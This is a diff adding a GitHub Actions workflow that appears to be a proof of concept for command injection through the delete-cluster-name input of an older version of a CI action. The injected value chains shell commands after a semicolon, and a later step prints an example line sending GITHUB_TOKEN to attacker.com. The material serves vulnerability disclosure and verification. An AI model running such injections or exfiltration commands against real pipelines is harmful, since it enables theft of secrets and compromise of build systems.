@@ -1,0 +1,53 @@
+name: POC - Command Injection via delete-cluster-name
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: POC - Command Injection via delete-cluster-name
+        # old version to verify bug
+        uses: mongodb/atlas-github-action@v0.2.0
+        continue-on-error: true
+        with:
+          # This demonstrates command injection - the semicolon allows command chaining
+          # We use --help to make atlas succeed, then inject commands that execute
+          # Format: atlas cluster delete ${{ inputs.delete-cluster-name }} --projectId ${{ inputs.delete-project-id }} --force
+          # Using --help makes the command succeed, then our injected commands execute
+          delete-cluster-name: "--help; echo '🚨 COMMAND INJECTION SUCCESSFUL via delete-cluster-name 🚨' > /tmp/poc-delete-cluster-success.txt && echo 'Injected via delete-cluster-name!' && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) > /tmp/poc-delete-cluster-info.txt #"
+          delete-project-id: "dummy-project-id"
+
+      - name: Verify Injection
+        shell: bash
+        run: |
+          if [ -f /tmp/poc-delete-cluster-success.txt ]; then
+            echo "✅ VULNERABILITY CONFIRMED: Command injection successful!"
+            cat /tmp/poc-delete-cluster-success.txt
+            echo ""
+            echo "The injected commands executed, proving the vulnerability."
+          else
+            echo "❌ Injection may have failed or file was not created"
+          fi
+
+      - name: Show Environment Info (Demonstrates Access)
+        shell: bash
+        run: |
+          echo "This demonstrates that injected commands have access to:"
+          echo "- Environment variables"
+          echo "- File system"
+          echo "- Network (could exfiltrate secrets)"
+          echo ""
+          echo "In a real attack, an attacker could:"
+          echo "  - Exfiltrate GITHUB_TOKEN: curl https://attacker.com?token=\$GITHUB_TOKEN"
+          echo "  - Access repository secrets"
+          echo "  - Modify artifacts"
+          echo "  - Perform lateral movement"
+
